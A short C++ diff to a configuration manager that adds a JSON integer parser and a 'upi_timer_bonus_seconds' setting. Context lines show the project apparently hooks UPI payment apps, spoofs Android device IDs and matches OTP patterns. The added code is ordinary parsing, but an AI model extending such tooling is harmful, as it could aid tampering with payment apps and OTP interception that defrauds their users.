@@ -131,6 +131,25 @@ std::string read_file(const std::string& path) {
     return ss.str();
 }
 
+int parse_int(const std::string& json, const std::string& key, int default_value) {
+    const std::string needle = "\"" + key + "\"";
+    auto pos = json.find(needle);
+    if (pos == std::string::npos) return default_value;
+    pos = json.find(':', pos);
+    if (pos == std::string::npos) return default_value;
+    auto start = json.find_first_not_of(" \t\r\n", pos + 1);
+    if (start == std::string::npos) return default_value;
+    size_t end = start;
+    while (end < json.size() && (std::isdigit(static_cast<unsigned char>(json[end])) || json[end] == '-')) {
+        ++end;
+    }
+    try {
+        return std::stoi(json.substr(start, end - start));
+    } catch (...) {
+        return default_value;
+    }
+}
+
 }  // namespace
 
 ConfigManager& ConfigManager::instance() {
@@ -186,6 +205,7 @@ bool ConfigManager::load() {
     config_.hooked_upi_apps = parse_bool_map(json, "hooked_upi_apps");
     config_.enable_device_id_spoof = parse_bool(json, "enable_device_id_spoof", false);
     config_.spoof_android_id = parse_string(json, "spoof_android_id", config_.spoof_android_id);
+    config_.upi_timer_bonus_seconds = parse_int(json, "upi_timer_bonus_seconds", 20);
 
     if (config_.otp_patterns.empty()) {
         config_.otp_patterns = {
